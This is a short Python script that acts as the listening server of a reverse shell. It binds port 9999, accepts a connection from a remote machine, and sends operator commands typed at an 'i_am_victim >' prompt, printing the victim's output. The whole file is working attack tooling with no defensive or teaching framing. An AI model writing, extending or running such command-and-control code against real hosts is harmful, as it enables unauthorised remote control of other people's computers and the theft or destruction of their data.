import  socket
import os
import sys


def create_socket():
    try:
        global host , port , s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print('Socket creating error...',str(msg))


                ########### Binding and listening to connections ###########

def bind_socket():
    try:
        global host , port , s
        print('host : ',host,'port :',port)
        print('Binding to the port : ',str(port))

        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print('Error binding socket to port \n Retrying the connection.....')

                ########### establishing the connection with client ###########

def accepting_connection():
    conn_obj , socket_address = s.accept()
    print('Connected with : ',socket_address[0] , 'at the port : ',str(socket_address[1]))

    send_cmd(conn_obj)

    conn_obj.close()

                ########### sending the cmd to client ###########

def send_cmd(conn_obj):
    while True:
        cmd = input('\ni_am_victim > ')
        if cmd == 'quit':
            conn_obj.close()
            s.close()
            print('Connection Interrupted')
            sys.exit()

        if len(str.encode(cmd))>0:
            conn_obj.send(str.encode(cmd))
            victim_response = str(conn_obj.recv(20480),'utf8')

            print(victim_response,end='')

def main():
    create_socket()
    bind_socket()
    accepting_connection()


main()